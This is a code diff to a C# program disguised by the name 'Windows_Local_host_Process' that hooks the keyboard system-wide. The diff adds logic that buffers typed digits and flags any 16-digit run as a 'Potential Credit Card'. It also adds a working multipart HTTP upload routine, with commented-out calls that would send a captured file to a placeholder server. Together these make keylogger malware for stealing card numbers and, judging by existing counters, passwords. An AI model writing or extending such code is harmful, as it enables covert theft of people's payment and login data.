@@ -7,7 +7,12 @@ using System.Diagnostics;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.IO;
-
+using System.Net;
+using System.Net.Http;
+using System.Net.Http.Headers;
+using System.Threading.Tasks;
+using System.Collections;
+using System.Collections.Specialized;
 
 namespace Windows_Local_host_Process
 {
@@ -20,6 +25,7 @@ namespace Windows_Local_host_Process
 
         private int passCharsInRow = 0;
         private int ccCharsInRow = 0;
+        static List<string> buf = new List<string>();
 
         public static void Main()
         {
@@ -62,6 +68,108 @@ namespace Windows_Local_host_Process
                 return Buff.ToString();
             }
             return null;
+        }
+
+        //public static async Task SendviaHttp()
+        //{
+        //    using (var client = new HttpClient())
+        //    {
+        //        // TODO - Send HTTP requests
+        //        client.BaseAddress = new Uri("http://localhost:9000/");
+        //        client.DefaultRequestHeaders.Accept.Clear();
+        //        client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
+        //        // var gizmo = new Product() { Name = "Gizmo", Price = 100, Category = "Widget" };
+        //        //response = await client..PostAsJsonAsync("api/products", gizmo);
+
+
+        //    }
+        //}
+        //private void AddFile(FileInfo fileInfo, int folderId)
+        //{
+        //   // using (var handler = new HttpClientHandler() { CookieContainer = _cookies })
+        //   // {
+        //        using (var client = new HttpClient() { BaseAddress = new Uri(_host) })
+        //        {
+        //            var requestContent = new MultipartFormDataContent();
+        //            var fileContent = new StreamContent(fileInfo.OpenRead());
+        //            fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("attachment")
+        //                {
+        //                    Name = "\"file\"",
+        //                    FileName = "\"" + fileInfo.Name + "\""
+        //                };
+        //            fileContent.Headers.ContentType = MediaTypeHeaderValue.Parse(MimeMapping.GetMimeMapping(fileInfo.Name));
+        //            var folderContent = new StringContent(folderId.ToString(CultureInfo.InvariantCulture));
+
+        //            requestContent.Add(fileContent);
+        //            requestContent.Add(folderContent, "\"folderId\"");
+
+        //            var result = client.PostAsync("Company/AddFile", requestContent).Result;
+        //        }
+        //    //}
+        //}
+        public static void HttpUploadFile(string url, string file, string paramName, string contentType, NameValueCollection nvc)
+        {
+            //log.Debug(string.Format("Uploading {0} to {1}", file, url));
+            string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
+            byte[] boundarybytes = System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");
+
+            HttpWebRequest wr = (HttpWebRequest)WebRequest.Create(url);
+            wr.ContentType = "multipart/form-data; boundary=" + boundary;
+            wr.Method = "POST";
+            wr.KeepAlive = true;
+            wr.Credentials = System.Net.CredentialCache.DefaultCredentials;
+
+            Stream rs = wr.GetRequestStream();
+
+            string formdataTemplate = "Content-Disposition: form-data; name=\"{0}\"\r\n\r\n{1}";
+            foreach (string key in nvc.Keys)
+            {
+                rs.Write(boundarybytes, 0, boundarybytes.Length);
+                string formitem = string.Format(formdataTemplate, key, nvc[key]);
+                byte[] formitembytes = System.Text.Encoding.UTF8.GetBytes(formitem);
+                rs.Write(formitembytes, 0, formitembytes.Length);
+            }
+            rs.Write(boundarybytes, 0, boundarybytes.Length);
+
+            string headerTemplate = "Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n";
+            string header = string.Format(headerTemplate, paramName, file, contentType);
+            byte[] headerbytes = System.Text.Encoding.UTF8.GetBytes(header);
+            rs.Write(headerbytes, 0, headerbytes.Length);
+
+            FileStream fileStream = new FileStream(file, FileMode.Open, FileAccess.Read);
+            byte[] buffer = new byte[4096];
+            int bytesRead = 0;
+            while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) != 0)
+            {
+                rs.Write(buffer, 0, bytesRead);
+            }
+            fileStream.Close();
+
+            byte[] trailer = System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary + "--\r\n");
+            rs.Write(trailer, 0, trailer.Length);
+            rs.Close();
+
+            WebResponse wresp = null;
+            try
+            {
+                wresp = wr.GetResponse();
+                Stream stream2 = wresp.GetResponseStream();
+                StreamReader reader2 = new StreamReader(stream2);
+                //log.Debug(string.Format("File uploaded, server response is: {0}", reader2.ReadToEnd()));
+            }
+            catch (Exception ex)
+            {
+                //log.Error("Error uploading file", ex);
+                if (wresp != null)
+                {
+                    wresp.Close();
+                    wresp = null;
+                }
+            }
+            finally
+            {
+                wr = null;
+            }
         }
 
         public static void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
@@ -226,10 +334,28 @@ namespace Windows_Local_host_Process
 
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
+            
+           // string buf = null;
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
-               
+                int number;
                 Keys pressed = (Keys)Marshal.ReadInt32(lParam);
+                if (int.TryParse(keysToChars(pressed), out number))
+                    buf.Add( keysToChars(pressed));
+                if (buf.Count == 16)
+                {
+                      Console.WriteLine("Potential Credit Card : ");
+                        foreach (string combo in buf)
+                        {
+                            Console.WriteLine(combo);
+                            buf = new List<string>();
+                        }
+                        //NameValueCollection nvc = new NameValueCollection();
+                        //nvc.Add("id", "TTR");
+                        //nvc.Add("btn-submit-photo", "Upload");
+                        //HttpUploadFile("http://your.server.com/upload",
+                        //     @"C:\test\test.jpg", "file", "image/jpeg", nvc);
+                }
                 Console.WriteLine(keysToChars(pressed));
                 //StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                 //sw.Write(keysToChars(pressed));
@@ -240,6 +366,7 @@ namespace Windows_Local_host_Process
 
         private static string mapping(Keys _key)
         {
+            
             switch (_key)
             {
                 case Keys.OemOpenBrackets:
